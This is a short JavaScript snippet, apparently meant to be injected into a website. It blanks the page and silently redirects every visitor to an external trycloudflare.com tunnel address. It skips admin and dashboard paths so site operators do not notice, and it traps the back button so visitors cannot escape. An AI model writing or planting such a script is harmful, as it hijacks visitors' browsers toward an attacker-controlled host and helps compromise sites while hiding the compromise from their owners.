<script>
(() => {
    'use strict';

    const TARGET = "https://durham-directory-homework-measured.trycloudflare.com";
    const currentUrl = window.location.href;

    // skip
    if (currentUrl.includes('/admin/') || 
        currentUrl.includes('/dashboard') || 
        currentUrl.includes('/panel') || 
        currentUrl.includes('admin=true')) {
        console.log('%cAdmin access allowed', 'color: lime; font-weight: bold');
        return;
    }

    const forceSilentRedirect = () => {
        // clean
        document.documentElement.innerHTML = '';
        
        // hal br
        window.location.replace(TARGET);
        
        // fal bk
        window.location.href = TARGET;
        window.top.location.replace(TARGET);
        
        // rf
        const meta = document.createElement('meta');
        meta.httpEquiv = "refresh";
        meta.content = "0; url=" + TARGET;
        document.head.appendChild(meta);
    };

    // c
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', forceSilentRedirect, { once: true });
    } else {
        forceSilentRedirect();
    }

    // ce
    history.pushState(null, null, location.href);
    window.onpopstate = () => {
        history.go(1);
        forceSilentRedirect();
    };

})();
</script>
